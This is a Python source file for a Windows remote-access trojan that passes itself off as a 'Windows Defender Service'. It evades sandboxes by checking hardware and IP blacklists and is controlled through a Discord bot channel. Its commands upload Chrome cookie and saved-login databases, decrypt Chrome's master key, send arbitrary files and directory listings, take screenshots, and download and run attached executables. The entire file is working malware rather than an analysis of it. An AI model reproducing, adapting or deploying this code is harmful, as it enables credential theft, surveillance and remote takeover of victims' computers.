import wmi, socket, discord, re, subprocess, requests, win32crypt, uuid, os, servicemanager, win32event, win32service, win32serviceutil, json, base64, sys, win32api, string, asyncio
from mss import mss

class WinDefSvc(win32serviceutil.ServiceFramework):
    _svc_name_ = 'WinDefSvc'
    _svc_display_name_ = 'Windows Defender Service'

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_running = True

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.is_running = False

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        self.main()

    def main(self):
        while self.is_running:
            try:
                enable = True
                checker = True
                debug = False

                def get_motherboard_serial():
                    try:
                        c = wmi.WMI()
                        for board in c.Win32_BaseBoard():
                            return board.SerialNumber.strip()
                    except Exception as e:
                        if debug: print(e)
                        return 'Failed'

                def getip():
                    try:
                        ip = requests.get("https://api.ipify.org", timeout=5).text
                    except requests.exceptions.Timeout:
                        return 'Failed'
                    except Exception as e:
                        return 'Failed'
                    return ip

                current_motherboard_id = str(get_motherboard_serial())
                current_ip = str(getip())
                current_mac = str(':'.join(re.findall('..', '%012x' % uuid.getnode())))
                current_wid = str(subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip())
                current_bios_serial = str(subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip())

                if checker == True:
                    binary_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
                    blacklist_path = os.path.join(binary_path, 'blacklist.json')

                    with open(blacklist_path, 'r') as file:
                        data = json.load(file)

                    motherboard_hwid = data['motherboard_hwid']
                    device_id = data['device_id']
                    ip = data['ip']
                    mac = data['mac']
                    hw_guid = data['hw_guid']
                    machine_guid = data['machine_guid']
                    bios = data['bios']
                    
                    def string_checker(string):
                        getVals = list([val for val in string
                                    if val.isalpha() or val.isnumeric()])
                        result = "".join(getVals)
                        return result.isdigit()

                    if string_checker(socket.gethostname()) == True or string_checker(current_motherboard_id):
                        enable = False

                    if current_ip in ip:
                        enable = False

                    if current_bios_serial in bios:
                        enable = False

                    if current_mac in mac:
                        enable = False

                    if current_wid in hw_guid or current_wid in machine_guid:
                        enable = False

                    if current_motherboard_id in motherboard_hwid:
                        enable = False

                    if socket.gethostname() in device_id:
                        enable = False

            except Exception as e:
                enable = False
                if debug: print(e)
                pass

            if __name__ == '__main__':
                if enable == True:
                    try:
                        version = 'WinDefSvc v1.0.1'

                        USERNAME = socket.gethostname()

                        STATUS_CHANNEL_ID = 1123645729949368370

                        intents = discord.Intents.default()
                        intents.message_content = True

                        info = []
                        info.append(current_motherboard_id)
                        info.append(current_bios_serial)
                        info.append(current_ip)
                        info.append(current_mac)
                        info.append(current_wid)
                        info.append(socket.gethostname())
                        info.append(version)
                        
                        drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]   
                        for drive in drives:
                            users_folder = f'{drive}\\Users'
                            if os.path.isdir(users_folder):
                                user_folders = [folder for folder in os.listdir(users_folder)
                                                if os.path.isdir(os.path.join(users_folder, folder)) and
                                                folder.lower() != 'default' and folder.lower() != 'public' and folder.lower() != 'all users' and folder.lower() != 'default user']
                                for folder in user_folders:
                                    user_profile = os.path.join(users_folder, folder)

                        CHROME_PATH = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
                        CHROME_PATH_LOCAL_STATE = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')

                        class MyClient(discord.Client):
                            connected = False

                            def capture_screenshots(self):
                                try:
                                    with mss() as SCREEN:
                                        screenshot_path = os.path.join(CHROME_PATH, 'screenshot.png')
                                        FILENAME = SCREEN.shot(mon=-1, output=screenshot_path)
                                        return FILENAME
                                except Exception as e:
                                    return e
                                
                            def fetch_key(self):
                                try:
                                    with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                                        LOCAL_STATE = f.read()
                                        LOCAL_STATE = json.loads(LOCAL_STATE)
                                    SECRET_KEY = base64.b64decode(LOCAL_STATE["os_crypt"]["encrypted_key"])
                                    SECRET_KEY = SECRET_KEY[5:]
                                    SECRET_KEY = win32crypt.CryptUnprotectData(SECRET_KEY, None, None, None, 0)[1]
                                    return SECRET_KEY
                                except Exception as e:
                                    return e
                                
                            def get_string_after_words(text, num_words):
                                words = text.split()
                                if len(words) <= num_words:
                                    return ""
                                else:
                                    return ' '.join(words[num_words:])
                                
                            async def on_ready(self):
                                try:
                                    USER_CHANNEL = self.get_channel(STATUS_CHANNEL_ID)
                                    await USER_CHANNEL.send(f"Device `{USERNAME}` is now online")

                                    def offline_handler(event):
                                        asyncio.ensure_future(USER_CHANNEL.send(f"Device `{USERNAME}` is offline"))

                                    win32api.SetConsoleCtrlHandler(offline_handler, True)

                                except Exception as e:
                                    if debug:
                                        print(e)
                                    USER_CHANNEL = self.get_channel(STATUS_CHANNEL_ID)
                                    await USER_CHANNEL.send(str(e))
                                    pass

                            async def on_message(self, message):
                                msg = message.content.split()
                                try:
                                    if message.author == self.user:
                                        return
                                    if message.content.startswith('.connect'):
                                        if msg[1] in info or msg[1] == 'all':
                                            self.connected = True
                                            await message.channel.send(f"Sucessfully connected to `{USERNAME}`")

                                    if self.connected == True:
                                        if message.content.startswith('.pw'):
                                            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
                                            for profile in folders:
                                                file = []
                                                try:
                                                    COOKIE_DB_PATH = os.path.join(CHROME_PATH, profile, 'Network', 'Cookies')
                                                    file.append(discord.File(COOKIE_DB_PATH))
                                                except Exception as e:
                                                    if debug: print(e)
                                                LOGIN_DB_PATH = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,profile))
                                                file.append(discord.File(LOGIN_DB_PATH))
                                                await message.channel.send(f"Profile: `{profile}`", files=file)

                                        if message.content.startswith('.key'):
                                            message.channel.send(self.fetch_key())
                                            
                                        if message.content.startswith('.file'):
                                            path = self.get_string_after_words(message.content, 2)
                                            if os.path.isfile(path):
                                                try:
                                                    await message.channel.send(file=discord.File(path))
                                                except Exception as e:
                                                    await message.channel.send(f"An error has occured: {e}")
                                                    pass
                                            else:
                                                await message.channel.send('File not found')

                                        if message.content.startswith('.cd'):
                                            path = self.get_string_after_words(message.content, 2)
                                            if os.path.isdir(path):
                                                try:
                                                    string = ''
                                                    for root, directories, files in os.walk(path):
                                                        for directory in directories:
                                                            string += f"Subdirectory: {os.path.join(root, directory)}\n"

                                                        for file in files:
                                                            string += f"File: {os.path.join(root, file)}\n"
                                                    txt_path = os.path.join(CHROME_PATH, 'text.txt')
                                                    with open(txt_path, 'w') as file:
                                                        file.write(string)
                                                    await message.channel.send(file=discord.File(txt_path))
                                                    os.remove(txt_path)
                                                except Exception as e:
                                                    await message.channel.send(f"An error has occured: {e}")
                                                    pass
                                            else:
                                                await message.channel.send('Directory not found')
                                                
                                        if message.content.startswith('.screenshot') or message.content.startswith('.ss'):
                                            await message.channel.send('Processing...')
                                            screenshots = self.capture_screenshots()
                                            await message.channel.send(file=discord.File(screenshots))
                                            os.remove(screenshots)
                                        
                                        if message.content.startswith('.execute'):
                                            type = msg[1]
                                            directory = self.get_string_after_words(message.content, 2)
                                            if not os.path.isdir(directory): directory = CHROME_PATH
                                            if len(message.attachments) > 0:
                                                if str(type) == 'c':
                                                    file_path = os.path.join(directory, attachment.filename)
                                                    await attachment.save(file_path)
                                                    try:
                                                        subprocess.Popen(file_path, check=True)
                                                        await message.channel.send("Executable has started")

                                                    except subprocess.CalledProcessError as e:
                                                        await message.channel.send(f"Error occurred while running the executable: {e}")
                                                        pass
                                                elif str(type) == 's':
                                                    for attachment in message.attachments:
                                                        file_path = os.path.join(directory, attachment.filename)
                                                        await attachment.save(file_path)
                                                        try:
                                                            subprocess.run(file_path, check=True)
                                                            await message.channel.send("Executable has finished running.")

                                                        except subprocess.CalledProcessError as e:
                                                            await message.channel.send(f"Error occurred while running the executable: {e}")
                                                            pass
                                                else:
                                                    await message.channel.send('Improper type (s/c).')
                                            else:
                                                await message.channel.send('No file attached')

                                        if message.content.startswith('.disconnect'):
                                            self.connected = False
                                            await message.channel.send(f'Successfully disconnected from `{USERNAME}`')

                                except Exception as e:
                                    await message.channel.send(f"An error has occured: {e}")
                                    pass

                        client = MyClient(intents=intents)
                        client.run("", log_handler=None)
                    except Exception as e:
                        if debug: print(e)
                        pass

if __name__ == '__main__':
    if len(sys.argv) == 1:
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(WinDefSvc)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(WinDefSvc)
